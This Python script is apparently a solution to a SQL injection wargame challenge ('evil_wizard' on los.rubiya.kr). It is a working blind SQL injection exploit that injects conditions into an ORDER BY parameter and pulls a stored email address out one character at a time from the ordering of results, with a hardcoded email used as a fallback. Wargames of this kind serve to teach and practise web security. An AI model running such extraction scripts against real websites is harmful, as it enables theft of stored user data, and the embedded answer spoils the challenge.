import requests
from bs4 import BeautifulSoup

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookie = {'PHPSESSID': 'cookie'}

def find_length():
    pwlength = 1

    while True:
        param = {"order": "length(email) = {}, id".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        html = BeautifulSoup(req.text, "html.parser")
        table = html.find_all("td")
        if "rubiya" in table[0]:
            return pwlength
        else:
            pwlength+=1

def find_pw():
    length = 30 #find_length()
    print("이메일 길이 : ", length)
    password = ""
    for i in range(length):
        value = 46
        while True:
            param = {"order": "ascii(substring(email, {}, 1)) = {}, id".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            html = BeautifulSoup(req.text, "html.parser")
            table = html.find_all("td")
            if "rubiya" in table[0]:
                password += chr(value)
                break
            else:
                value+=1
            if value > 128:
                email = "rubiya805@gmail.com"
                password+=email[i]
                break
    print("비밀번호는: ", password)

find_pw()